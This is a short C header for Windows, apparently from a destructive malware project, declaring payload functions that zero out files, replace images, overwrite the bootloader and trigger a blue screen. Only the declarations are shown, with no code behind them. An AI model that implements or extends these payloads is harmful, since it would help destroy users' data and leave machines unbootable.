#ifndef PAYLOADS_H
#define PAYLOADS_H

#include <windows.h>
#include <stddef.h>

#define BUFFER_SIZE 4096
#define IMAGE_PATH "assets/image.jpg"

BOOL ZeroOutFile(char* filename);
BOOL ReplaceImage(char* filename);
BOOL OverwriteBootloader();
void TriggerBSOD();

#endif